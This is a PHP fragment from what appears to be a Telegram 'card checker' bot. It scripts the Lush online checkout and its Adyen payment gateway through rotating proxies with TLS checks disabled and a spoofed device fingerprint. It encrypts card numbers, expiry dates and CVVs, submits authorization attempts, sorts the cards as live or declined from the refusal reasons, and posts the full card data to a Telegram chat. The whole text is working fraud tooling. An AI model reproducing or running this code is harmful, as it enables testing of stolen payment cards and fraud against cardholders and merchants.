curl_setopt($ch, CURLOPT_POSTFIELDS, '[{"operationName":"deleteMetadata","variables":{"id":"'.$id.'","keys":["store_id","shipping_type"]},"query":"mutation deleteMetadata($id: ID!, $keys: [String!]!) {\n  deleteMetadata(id: $id, keys: $keys) {\n    metadataErrors {\n      field\n      code\n      __typename\n    }\n    item {\n      metadata {\n        key\n        value\n        __typename\n      }\n      __typename\n    }\n    __typename\n  }\n}"}]');
$curl = curl_exec($ch);

$ch = curl_init();
curl_setopt($ch, CURLOPT_PROXY, $socks5);
curl_setopt($ch, CURLOPT_PROXYUSERPWD, $rotate);
curl_setopt($ch, CURLOPT_URL, 'https://checkout.lush.com/api/graphql');
curl_setopt($ch, CURLOPT_POST, 1);
$headers = array();
$headers[] = 'Host: checkout.lush.com';
$headers[] = 'User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:122.0) Gecko/20100101 Firefox/122.0';
$headers[] = 'Accept: */*';
$headers[] = 'Accept-Language: es-CL,es;q=0.8,en-US;q=0.5,en;q=0.3';
$headers[] = 'content-type: application/json';
$headers[] = 'Origin: https://checkout.lush.com';
curl_setopt($ch, CURLOPT_HTTPHEADER, $headers);
curl_setopt($ch, CURLOPT_FOLLOWLOCATION, 1);
curl_setopt($ch, CURLOPT_RETURNTRANSFER, 1);
curl_setopt($ch, CURLOPT_SSL_VERIFYPEER, 0);
curl_setopt($ch, CURLOPT_SSL_VERIFYHOST, 0);
curl_setopt($ch, CURLOPT_COOKIEFILE, $cookies);
curl_setopt($ch, CURLOPT_COOKIEJAR, $cookies);
curl_setopt($ch, CURLOPT_POSTFIELDS, '[{"operationName":"checkoutDeliveryMethodUpdate","variables":{"languageCode":"EN_US","channelAddress":{"country":"US"},"id":"'.$id.'","deliveryMethodId":"'.$ShippingMethod.'"},"query":"fragment Warehouse on Warehouse {\n  id\n  metadata {\n    ...MetadataItem\n    __typename\n  }\n  name\n  slug\n  email\n  clickAndCollectOption\n  address {\n    ...Address\n    __typename\n  }\n  __typename\n}\n\nfragment MetadataItem on MetadataItem {\n  key\n  value\n  __typename\n}\n\nfragment Address on Address {\n  id\n  firstName\n  lastName\n  companyName\n  streetAddress1\n  streetAddress2\n  city\n  cityArea\n  postalCode\n  country {\n    code\n    country\n    __typename\n  }\n  countryArea\n  phone\n  isDefaultShippingAddress\n  isDefaultBillingAddress\n  __typename\n}\n\nfragment Money on Money {\n  currency\n  amount\n  __typename\n}\n\nfragment TaxedMoney on TaxedMoney {\n  currency\n  gross {\n    ...Money\n    __typename\n  }\n  tax {\n    ...Money\n    __typename\n  }\n  net {\n    ...Money\n    __typename\n  }\n  __typename\n}\n\nfragment SelectedAttribute on SelectedAttribute {\n  attribute {\n    name\n    id\n    slug\n    inputType\n    __typename\n  }\n  values {\n    name\n    id\n    slug\n    translation(languageCode: $languageCode) {\n      id\n      name\n      richText\n      __typename\n    }\n    __typename\n  }\n  __typename\n}\n\nfragment Product on Product {\n  id\n  name\n  slug\n  description\n  seoDescription\n  seoTitle\n  isAvailableForPurchase\n  isAvailable\n  availableForPurchase\n  translation(languageCode: $languageCode) {\n    id\n    name\n    description\n    seoDescription\n    seoTitle\n    __typename\n  }\n  weight {\n    value\n    __typename\n  }\n  metadata {\n    ...MetadataItem\n    __typename\n  }\n  productType {\n    hasVariants\n    slug\n    name\n    __typename\n  }\n  thumbnail {\n    url\n    alt\n    __typename\n  }\n  images {\n    id\n    alt\n    url\n    thumbnail: url(size: 100)\n    __typename\n  }\n  category {\n    id\n    name\n    __typename\n  }\n  collections {\n    id\n    name\n    __typename\n  }\n  attributes {\n    ...SelectedAttribute\n    __typename\n  }\n  __typename\n}\n\nfragment ProductVariant on ProductVariant {\n  id\n  name\n  sku\n  quantityAvailable\n  digitalQuantityAvailable: quantityAvailable(address: $channelAddress)\n  metadata {\n    ...MetadataItem\n    __typename\n  }\n  weight {\n    value\n    __typename\n  }\n  pricing {\n    ...VariantPricingInfo\n    __typename\n  }\n  attributes {\n    ...SelectedAttribute\n    __typename\n  }\n  __typename\n}\n\nfragment CheckoutLine on CheckoutLine {\n  id\n  quantity\n  totalPrice {\n    ...TaxedMoney\n    __typename\n  }\n  variant {\n    ...ProductVariant\n    product {\n      ...Product\n      variants {\n        ...ProductVariant\n        __typename\n      }\n      __typename\n    }\n    __typename\n  }\n  __typename\n}\n\nfragment VariantPricingInfo on VariantPricingInfo {\n  onSale\n  price {\n    ...TaxedMoney\n    __typename\n  }\n  priceUndiscounted {\n    ...TaxedMoney\n    __typename\n  }\n  __typename\n}\n\nfragment ShippingMethod on ShippingMethod {\n  id\n  name\n  description\n  price {\n    ...Money\n    __typename\n  }\n  type\n  translation(languageCode: $languageCode) {\n    id\n    name\n    description\n    __typename\n  }\n  maximumDeliveryDays\n  minimumDeliveryDays\n  message\n  active\n  metadata {\n    ...MetadataItem\n    __typename\n  }\n  __typename\n}\n\nfragment Checkout on Checkout {\n  id\n  created\n  lastChange\n  token\n  quantity\n  email\n  channel {\n    id\n    slug\n    __typename\n  }\n  isShippingRequired\n  voucherCode\n  discount {\n    ...Money\n    __typename\n  }\n  billingAddress {\n    ...Address\n    __typename\n  }\n  shippingAddress {\n    ...Address\n    __typename\n  }\n  shippingMethod {\n    ...ShippingMethod\n    __typename\n  }\n  shippingMethods {\n    ...ShippingMethod\n    __typename\n  }\n  availableCollectionPoints {\n    ...Warehouse\n    __typename\n  }\n  deliveryMethod {\n    ...Warehouse\n    __typename\n  }\n  availablePaymentGateways {\n    name\n    id\n    config {\n      value\n      field\n      __typename\n    }\n    __typename\n  }\n  metadata {\n    ...MetadataItem\n    __typename\n  }\n  lines {\n    ...CheckoutLine\n    __typename\n  }\n  shippingPrice {\n    ...TaxedMoney\n    __typename\n  }\n  subtotalPrice {\n    ...TaxedMoney\n    __typename\n  }\n  totalPrice {\n    ...TaxedMoney\n    __typename\n  }\n  __typename\n}\n\nmutation checkoutDeliveryMethodUpdate($id: ID!, $deliveryMethodId: ID!, $languageCode: LanguageCodeEnum!, $channelAddress: AddressInput!) {\n  checkoutDeliveryMethodUpdate(id: $id, deliveryMethodId: $deliveryMethodId) {\n    checkout {\n      ...Checkout\n      __typename\n    }\n    errors {\n      message\n      field\n      code\n      __typename\n    }\n    __typename\n  }\n}"}]');
$curl = curl_exec($ch);
curl_close($ch);

$ch = curl_init();
curl_setopt($ch, CURLOPT_PROXY, $socks5);
curl_setopt($ch, CURLOPT_PROXYUSERPWD, $rotate);
curl_setopt($ch, CURLOPT_URL, 'https://checkout.lush.com/api/checkout/payment-methods');
curl_setopt($ch, CURLOPT_POST, 1);
$headers = array();
$headers[] = 'Host: checkout.lush.com';
$headers[] = 'User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:122.0) Gecko/20100101 Firefox/122.0';
$headers[] = 'Accept: */*';
$headers[] = 'Accept-Language: es-CL,es;q=0.8,en-US;q=0.5,en;q=0.3';
$headers[] = 'content-type: application/json';
$headers[] = 'Origin: https://checkout.lush.com';
curl_setopt($ch, CURLOPT_HTTPHEADER, $headers);
curl_setopt($ch, CURLOPT_FOLLOWLOCATION, 1);
curl_setopt($ch, CURLOPT_RETURNTRANSFER, 1);
curl_setopt($ch, CURLOPT_SSL_VERIFYPEER, 0);
curl_setopt($ch, CURLOPT_SSL_VERIFYHOST, 0);
curl_setopt($ch, CURLOPT_COOKIEFILE, $cookies);
curl_setopt($ch, CURLOPT_COOKIEJAR, $cookies);
curl_setopt($ch, CURLOPT_POSTFIELDS, '{"id":"'.$id.'","paymentGateways":[{"id":"app.saleor.adyen"}],"amount":14.31}');
$curl = curl_exec($ch);




$encryption = new Encryptions();

$encryption->setData([
    "adyenkey" => "10001|BAC4B89E057DFB9686E438E8EB83B7FB554E1B7BDEF9308EB3B878D7896197C7D0BDA57ED85298760E6C47741E21A510732F2537F89E8AD99CDBCB9132B704FDB8D1D5432B14AAD24E342CEBB0C23D8A268CBFAAEB6FDAEB5CD3C3184089087B576417C807464B56534101C0CE9F72ADD1A8BE3608D3BC1203AF2800113679BCC1CE156CF9835EA8C01B33F9C7838002AFE753AD1DE51D1B5B304EAF68DF5C707E831876E9A5D094DF242B80110EFB923C4807FB4BBF2026A09ABEB6AFE885E22E066AE7931B5EE62AF97D7C69FB539F2A72624ECECECFEEE2008FD2C77C3CAF5E017493F97D43305971891F12A709C023EE2A6910DF94D2D94B3BF25418A50D",
    "card" => $cc,
    "month" => $mes,
    "year" => $ano,
    "cvv" => $cvv,
]);
$encryption->setAdyenVersion('v2');
$encryption->execute();
$response = $encryption->getResponse();
$encryptedData = $response['encryptedData'];

$encryptedCardNumber = $encryptedData['encryptedCardNumber'];
$encryptedExpiryMonth = $encryptedData['encryptedExpiryMonth'];
$encryptedExpiryYear = $encryptedData['encryptedExpiryYear'];
$encryptedSecurityCode = $encryptedData['encryptedSecurityCode'];

if(strlen($cc) < 16){
  $cv = substr($cc ,0,2);
};
$cv = substr($cc ,0,1);
$tarjetas = ["4" => "visa","5" => "mc","34" => "amex", "62" => "cup","30" => "diners","6" => "discover","35" => "jcb"];
$br = $tarjetas[$cv];

$ch = curl_init();
curl_setopt($ch, CURLOPT_PROXY, $socks5);
curl_setopt($ch, CURLOPT_PROXYUSERPWD, $rotate);
curl_setopt($ch, CURLOPT_URL, 'https://checkout.lush.com/api/checkout/initialize-transaction');
curl_setopt($ch, CURLOPT_POST, 1);
$headers = array();
$headers[] = 'Host: checkout.lush.com';
$headers[] = 'User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:122.0) Gecko/20100101 Firefox/122.0';
$headers[] = 'Accept: */*';
$headers[] = 'Accept-Language: es-CL,es;q=0.8,en-US;q=0.5,en;q=0.3';
$headers[] = 'content-type: application/json';
$headers[] = 'Origin: https://checkout.lush.com';
curl_setopt($ch, CURLOPT_HTTPHEADER, $headers);
curl_setopt($ch, CURLOPT_FOLLOWLOCATION, 1);
curl_setopt($ch, CURLOPT_RETURNTRANSFER, 1);
curl_setopt($ch, CURLOPT_SSL_VERIFYPEER, 0);
curl_setopt($ch, CURLOPT_SSL_VERIFYHOST, 0);
curl_setopt($ch, CURLOPT_COOKIEFILE, $cookies);
curl_setopt($ch, CURLOPT_COOKIEJAR, $cookies);
curl_setopt($ch, CURLOPT_POSTFIELDS, '{"id":"'.$id.'","data":{"riskData":{"clientData":"eyJ2ZXJzaW9uIjoiMS4wLjAiLCJkZXZpY2VGaW5nZXJwcmludCI6IkRwcXdVNHpFZE4wMDUwMDAwMDAwMDAwMDAwMkozOEQ1NXVTRzAwMjU1Mzc4MDBjVkI5NGlLekJHTUpDamRyTUJXRkJpeDdSWDNhejgwMDJRT1VYVTRNYmRZMDAwMDBxWmtURXhNcENPUG9pRXNWMzZsbWRuSGNoc2xvOEU6NDAiLCJwZXJzaXN0ZW50Q29va2llIjpbIl9ycF91aWQ9M2MyYmY5OGQtNDZmZi0wNmZhLWM1OTEtYWE1OGY2YjI1MDFmIl0sImNvbXBvbmVudHMiOnsidXNlckFnZW50IjoiMDhlMTlmMzhlNDA0MWUzOWIwNWI3YTZiMWIwZGZjZTkiLCJ3ZWJkcml2ZXIiOjAsImxhbmd1YWdlIjoiZXMtQ0wiLCJjb2xvckRlcHRoIjoyNCwicGl4ZWxSYXRpbyI6MSwiaGFyZHdhcmVDb25jdXJyZW5jeSI6OCwic2NyZWVuV2lkdGgiOjc2OCwic2NyZWVuSGVpZ2h0IjoxMzY2LCJhdmFpbGFibGVTY3JlZW5XaWR0aCI6NzY4LCJhdmFpbGFibGVTY3JlZW5IZWlnaHQiOjEzNjYsInRpbWV6b25lT2Zmc2V0IjozMDAsInRpbWV6b25lIjoiQW1lcmljYS9HdWF5YXF1aWwiLCJzZXNzaW9uU3RvcmFnZSI6MSwibG9jYWxTdG9yYWdlIjoxLCJpbmRleGVkRGIiOjEsImFkZEJlaGF2aW9yIjowLCJvcGVuRGF0YWJhc2UiOjAsInBsYXRmb3JtIjoiV2luMzIiLCJkb05vdFRyYWNrIjoiNzFmYmJiZmU4YTdiN2M3MTk0MmFlYjliZjlmMGY2MzciLCJwbHVnaW5zIjoiMjljZjcxZTNkODFkNzRkNDNhNWIwZWI3OTQwNWJhODciLCJjYW52YXMiOiJkOTNkNzljZWYxZmYyNzdiMDVjZjJhOGI1ZWIzZTAxMyIsIndlYmdsIjoiYmIzMTBmNzMzY2RlYTI5N2U2MjE3N2YyODQzZDg1OTUiLCJ3ZWJnbFZlbmRvckFuZFJlbmRlcmVyIjoiR29vZ2xlIEluYy4gKEludGVsKX5BTkdMRSAoSW50ZWwsIEludGVsKFIpIEhEIEdyYXBoaWNzIERpcmVjdDNEMTEgdnNfNV8wIHBzXzVfMCkiLCJhZEJsb2NrIjowLCJoYXNMaWVkTGFuZ3VhZ2VzIjowLCJoYXNMaWVkUmVzb2x1dGlvbiI6MCwiaGFzTGllZE9zIjowLCJoYXNMaWVkQnJvd3NlciI6MCwiZm9udHMiOiJiYzA4ZTExZjczNzIxYmQ1MzM3MmJkMzc0ODNkNDU4OSIsImF1ZGlvIjoiNmU1NzRhNmU2YTdhYzVmMDVjNjcxYWE0OGE3NjE2OTUiLCJlbnVtZXJhdGVEZXZpY2VzIjoiNjVmZTE3ODI4MzFhNWM1YzQ5MTE4MGUyMzRhNzhmMTcifX0="},"paymentMethod":{"type":"scheme","holderName":"'.$firstname.' '.$lastname.'","encryptedCardNumber":"'.$encryptedCardNumber.'","encryptedExpiryMonth":"'.$encryptedExpiryMonth.'","encryptedExpiryYear":"'.$encryptedExpiryYear.'","encryptedSecurityCode":"'.$encryptedSecurityCode.'","brand":"'.$br.'","checkoutAttemptId":"f0b8cfa8-94ff-4d6f-9704-dbbff86512431709236125409727D77DA08C8941A91475972C02D6B81A1938F3F843EA22B4EEB837FB28A66E1"},"browserInfo":{"acceptHeader":"*/*","colorDepth":24,"language":"es-CL","javaEnabled":false,"screenHeight":768,"screenWidth":1366,"userAgent":"Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:122.0) Gecko/20100101 Firefox/122.0","timeZoneOffset":300},"origin":"https://checkout.lush.com","clientStateDataIndicator":true,"returnUrl":"https://checkout.lush.com/us/en_us/receipt?checkout='.$id.'"},"amount":14.31,"action":"AUTHORIZATION"}');
$curl = curl_exec($ch);
$refusalReason = getStr($curl, '"refusalReason":"', '",');
$refusalReasonCode = getStr($curl, '"refusalReasonCode":"', '",');
$cvcResult = getStr($curl, '"refusalReasonRaw":"', '",');
$tiempo_final = microtime(true);
$tiempo = $tiempo_final - $tiempo_inicial;
$tiempo = substr($tiempo, 0, 4);
if(strlen($mes) == 1){
    $mes = '0'.$mes;
}
bot('editMessageText',[
    'chat_id'=>$chatId,
    'disable_web_page_preview' => true,
    'message_id'=>$messageidtoedit,
    'text'=>"<b>[<a href='https://t.me/ritabotchk/35'>ϟ</a>] Gate 3D: >_ $-3D Adyen
━━━━━━━━━━━━━━━━
[<a href='https://t.me/ritabotchk/35'>ϟ</a>] Status: <code>ALMOST FINISHED 🟩</code>
[<a href='https://t.me/ritabotchk/35'>ϟ</a>] Gateway: <code>$NameGater</code>
[<a href='https://t.me/ritabotchk/35'>ϟ</a>] Card: <code>$cc|$mes|$ano|$cvv</code> 
━━━━━━━━━━━━━━━━
[<a href='https://t.me/ritabotchk/35'>ϟ</a>] Country: <code>$country - $emoji</code>
[<a href='https://t.me/ritabotchk/35'>ϟ</a>] Type: <code>$type - $brand - $scheme</code>
[<a href='https://t.me/ritabotchk/35'>ϟ</a>] Bank: <code>$bank</code> 
━━━━━━━━━━━━━━━━
[<a href='https://t.me/ritabotchk/35'>ϟ</a>] Checked by: <a href='tg://user?id=$userId'>$username</a>[<code>$Rank</code>]
━━━━━━━━━━━━━━━━</b>",
'parse_mode'=>'html',
'reply_to_message_id'=> $message_id]);
antisppre($gId);



if (strpos($curl, "AUTHORIZATION_ACTION_REQUIRED")){ 
$status = "[ DECLINED 🔴 ]";
$response = "3D Card";
}elseif(empty($curl)){ 
$status = "unknown";
$response = "Error generating a token";
}elseif ($refusalReason == "CVC Declined"){ 
$status = "Approved!🟩";
$response = "$refusalReasonCode :$refusalReason :( $cvcResult ) 🟩";
}elseif ($cvcResult == "00 : Approved or completed successfully"){ 
$status = "Approved!🟩";
$response = "Charged successfully🟩";
}elseif ($refusalReason == "Not enough balance"){ 
$status = "Approved CVV!🟩";
$response = "$refusalReasonCode :$refusalReason :( $cvcResult ) 🟩";
}else{
$status = "[ DECLINED 🔴 ]";
$response = "$refusalReasonCode :$refusalReason :( $cvcResult )";
}


//file_put_contents("resp.txt",$curl);
   
   
   
bot('editMessageText',[
    'chat_id'=>$chatId,
    'disable_web_page_preview' => true,
    'message_id'=>$messageidtoedit,
    'text'=>"<b>[<a href='https://t.me/ritabotchk/35'>ϟ</a>] Gate 3D: >_ $-3D Adyen
━━━━━━━━━━━━━━━━
[<a href='https://t.me/ritabotchk/35'>ϟ</a>] Card: <code>$cc|$mes|$ano|$cvv</code> 
[<a href='https://t.me/ritabotchk/35'>ϟ</a>] Status: <code>$status</code>
[<a href='https://t.me/ritabotchk/35'>ϟ</a>] Response: <code>$response</code>
━━━━━━━━━━━━━━━━
[<a href='https://t.me/ritabotchk/35'>ϟ</a>] Country: <code>$country - $emoji</code>
[<a href='https://t.me/ritabotchk/35'>ϟ</a>] Type: <code>$type - $brand - $scheme</code>
[<a href='https://t.me/ritabotchk/35'>ϟ</a>] Bank: <code>$bank</code> 
━━━━━━━━━━━━━━━━
[<a href='https://t.me/ritabotchk/35'>ϟ</a>] Card Check info: Proxy's: <code>Live ✅</code> 
[<a href='https://t.me/ritabotchk/35'>ϟ</a>] Time: <code>$tiempo</code> | Gate: <code>$NameGater</code>
[<a href='https://t.me/ritabotchk/35'>ϟ</a>] Checked by: <a href='tg://user?id=$userId'>$username</a>[<code>$Rank</code>]
━━━━━━━━━━━━━━━━</b>",
'parse_mode'=>'html',
'reply_to_message_id'=> $message_id]);
}
